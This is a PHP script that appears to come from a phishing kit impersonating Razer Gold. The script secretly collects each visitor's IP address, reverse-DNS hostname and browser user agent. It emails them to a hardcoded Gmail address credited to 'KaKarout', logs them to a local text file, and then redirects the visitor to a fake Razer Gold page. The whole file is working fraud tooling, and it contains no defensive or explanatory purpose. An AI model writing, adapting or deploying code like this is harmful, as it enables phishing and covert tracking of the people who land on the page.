<?php
$ip = $_SERVER["REMOTE_ADDR"];
$hostname = gethostbyaddr($ip);

$send = "oyyiigg@gmail.com";
$subject = "~ New Résultat By Y K K ~ | $ip";

header("Location: ../RazerGold");

$message = "|----------|By KaKarout|--------------|\n";
$message .= "-------------------- Data-info Choisi Razer Gold -------------------\n";
$message .= "--------------  Infos -------------\n";
$message .= "|---------------|Info|-------------------|\n";
$message .= "IP      : $ip\n";
$message .= "HOST    : $hostname\n";
$message .= "BROWSER : " . $_SERVER['HTTP_USER_AGENT'] . "\n";
$message .= "|----------|By KaKarout|--------------|\n";

mail($send, $subject, $message);

$file = fopen("./Data-info.txt", 'a');
fwrite($file, $message);
fclose($file);
?>